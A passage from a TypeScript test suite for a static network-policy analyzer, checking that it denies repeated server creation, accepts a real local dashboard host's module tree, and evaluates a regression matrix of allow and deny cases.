    );
    expect(loop.reasons).toEqual(['CREATE_SERVER_MULTIPLE']);
    // A loop that instantiates nothing leaves a single trailing creation allowed.
    const loopNoServer = analyzeNetworkPolicy(
      `${NS}\nfunction make() { for (let i = 0; i < 2; i += 1) { void i; } return http.createServer(${L}); }\nmake().listen(4317, '127.0.0.1');`,
    );
    expect(loopNoServer.reasons).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Real host
// ---------------------------------------------------------------------------

describe('D3 network policy accepts the real Stage-A host', () => {
  it('allows the real executable closure — host, Cockpit boundary and domain kernel — through the host module graph', () => {
    // The purity suite proves this pinned list is the host's real executable closure; here the detector accepts it as one tree.
    const sources = readHostClosure();
    expect(sources.map((source) => source.file)).toEqual([...EXPECTED_HOST_CLOSURE]);
    expect(sources).toHaveLength(12);
    expect(sources.map((source) => source.file)).toContain('cockpit-host/server.ts');
    const results = analyzeNetworkPolicyTree(sources);
    expect(results.size).toBe(sources.length);
    for (const [file, result] of results) {
      expect(result.fixpoint.state, file).toBe('CONVERGED');
      expect(result.reasons, `${file}: ${describeFindings(result)}`).toEqual([]);
      expect(result.verdict, file).toBe('ALLOW');
    }
  });

  it('fails closed on the real server.ts alone: its response bodies are proven only through sibling exports', () => {
    const standalone = analyzeNetworkPolicy(readFileSync(join(hostDir, 'server.ts'), 'utf8'));
    expect(standalone.reasons, describeFindings(standalone)).toEqual(['RESPONSE_END_ARGUMENT']);
    const inspection = inspectNetworkPolicy(readFileSync(join(hostDir, 'render.ts'), 'utf8'));
    expect([...inspection.hostExports.stringFunctions]).toContain('renderDashboard');
    const styles = inspectNetworkPolicy(readFileSync(join(hostDir, 'styles.ts'), 'utf8'));
    expect([...styles.hostExports.strings]).toEqual(['STYLES']);
    const server = inspectNetworkPolicy(readFileSync(join(hostDir, 'server.ts'), 'utf8'));
    expect([...server.hostExports.factories]).toEqual(['createCockpitServer']);
    expect(server.instantiationSites).toBe(1);
  });

  it('proves the real server.ts through the intended mechanisms', () => {
    const inspection = inspectNetworkPolicy(readFileSync(join(hostDir, 'server.ts'), 'utf8'));
    const [factory] = identifiersNamed(inspection.sourceFile, 'createCockpitServer');
    const factorySymbol = factory === undefined ? undefined : inspection.valueSymbolOf(factory);
    expect(factorySymbol && inspection.isConfinedFactory(factorySymbol)).toBe(true);
    const parameters = collectNodes(inspection.sourceFile, ts.isParameter);
    const factsByName = new Map<string, readonly string[]>();
    for (const parameter of parameters) {
      if (!ts.isIdentifier(parameter.name)) continue;
      const symbol = inspection.valueSymbolOf(parameter.name);
      if (symbol !== undefined) factsByName.set(`${parameter.name.text}@${String(parameter.pos)}`, inspection.factsOf(symbol));
    }
    const facts = [...factsByName.values()].filter((list) => list.length > 0).map((list) => list.join(','));
    expect(facts.sort()).toEqual(['REQUEST:ROOT', 'RESPONSE:PARAM', 'RESPONSE:ROOT']);
  });
});

// ---------------------------------------------------------------------------
// Regression matrix
// ---------------------------------------------------------------------------

describe('D3 network policy semantic regression matrix', () => {
  it('covers every frozen category with at least one MUST_DENY or MUST_ALLOW row', () => {
    for (const category of REGRESSION_CATEGORIES) {
      const rows = D3_REGRESSION_MATRIX.filter((row) => row.category === category && row.expectation !== 'OUTSIDE_DECLARED_BOUNDARY');
      expect(rows.length, category).toBeGreaterThan(0);
    }
  });

  it('has unique row names within each category', () => {
    const seen = new Set<string>();
    for (const row of D3_REGRESSION_MATRIX) {
      const key = `${row.category}::${row.name}`;
      expect(seen.has(key), key).toBe(false);
      seen.add(key);
    }
  });

  it('closes every PR #64 finding F-1 through F-7 with at least one row', () => {
    const closed = new Set(D3_REGRESSION_MATRIX.flatMap((row) => row.closes ?? []));
    expect([...closed].sort()).toEqual(['F-1', 'F-2', 'F-3', 'F-4', 'F-5', 'F-6', 'F-7']);
  });

  const byCategory = new Map<string, RegressionRow[]>();
  for (const row of D3_REGRESSION_MATRIX) {
    const rows = byCategory.get(row.category) ?? [];
    rows.push(row);
    byCategory.set(row.category, rows);
  }

  for (const [category, rows] of byCategory) {
    describe(category, () => {
      for (const row of rows) {
        const label = `${row.expectation}: ${row.name}`;
        it(label, () => {
          const result = analyzeNetworkPolicy(row.source, row.options ?? {});
          const detail = `${row.source}\n--> ${describeFindings(result)} [${result.fixpoint.state}]`;
          switch (row.expectation) {
            case 'MUST_DENY':
              expect(result.verdict, detail).toBe('DENY');
              for (const reason of row.reasons ?? []) expect(result.reasons, detail).toContain<ReasonCode>(reason);
              break;
            case 'MUST_ALLOW':
              expect(result.reasons, detail).toEqual([]);
              expect(result.verdict, detail).toBe('ALLOW');
              expect(result.fixpoint.state, detail).toBe('CONVERGED');
              break;
            case 'OUTSIDE_DECLARED_BOUNDARY':
              expect(['ALLOW', 'DENY']).toContain(result.verdict);
              break;
          }
        });
      }
    });
  }
});
